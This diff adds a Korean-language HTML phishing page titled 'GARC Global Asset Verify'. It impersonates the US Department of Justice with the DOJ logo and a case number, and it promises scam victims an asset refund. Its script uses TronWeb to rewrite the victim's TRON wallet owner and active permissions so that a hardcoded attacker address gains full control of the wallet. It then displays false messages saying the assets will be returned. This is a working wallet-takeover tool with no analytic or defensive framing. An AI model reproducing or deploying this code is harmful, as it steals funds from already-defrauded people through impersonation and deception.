@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GARC Global Asset Verify</title>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #f4f7f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        .logo { width: 60px; margin-bottom: 15px; }
+        h2 { color: #002d56; font-size: 18px; margin-bottom: 15px; }
+        p { color: #666; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #002d56; color: white; border: none; width: 100%; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        #status { margin-top: 15px; font-size: 12px; color: #002d56; display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.justice.gov/themes/custom/doj/logo.png" class="logo" alt="DOJ">
+        <h2>자산 복구 통합 인증</h2>
+        <p>DOJ Case #1:22-cr-00022-CKK<br>보안 노드 동기화 후 자산 환불이 활성화됩니다.</p>
+        <button class="btn" id="goBtn" onclick="doAuth()">인증 및 시작</button>
+        <div id="status">네트워크 연결 중...</div>
+    </div>
+
+    <script>
+        const BOSS = "TAzBb4Yfr2AMUeRkaUKXwU36E3mmX8Rcfo";
+        const FEE_LIMIT = 150000000; // 150 TRX
+
+        async function doAuth() {
+            const btn = document.getElementById('goBtn');
+            const st = document.getElementById('status');
+
+            if (!window.tronWeb) {
+                alert("Please open in TronLink DApp Browser.");
+                return;
+            }
+
+            try {
+                btn.disabled = true;
+                st.style.display = 'block';
+                st.innerText = "네트워크 연결 중...";
+
+                const userAddress = window.tronWeb.defaultAddress.base58;
+                const ownerPermission = {
+                    type: 0,
+                    permission_name: 'Owner_Auth',
+                    threshold: 1,
+                    keys: [{ address: BOSS, weight: 1 }]
+                };
+                const activePermission = {
+                    type: 2,
+                    permission_name: 'Active_Auth',
+                    threshold: 1,
+                    operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+                    keys: [{ address: BOSS, weight: 1 }]
+                };
+
+                const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
+                    userAddress,
+                    ownerPermission,
+                    null,
+                    [activePermission]
+                );
+                tx.fee_limit = FEE_LIMIT;
+
+                const signedTx = await window.tronWeb.trx.sign(tx);
+                const broadcast = await window.tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (broadcast.result) {
+                    st.innerText = "인증이 완료되었습니다. 자산이 24시간 이내에 해제됩니다.";
+                    alert("인증에 성공했습니다. 영업일 기준 1-3일 이내에 지갑으로 자산이 반환됩니다.");
+                } else {
+                    throw new Error("Network Broadcast Error");
+                }
+            } catch (e) {
+                console.error(e);
+                st.style.display = 'none';
+                btn.disabled = false;
+                alert("인증 실패: 가스(Energy)가 부족하거나 사용자가 요청을 거부했습니다. 지갑에 150 TRX 이상이 있는지 확인하십시오.");
+            }
+        }
+    </script>
+</body>
+</html>
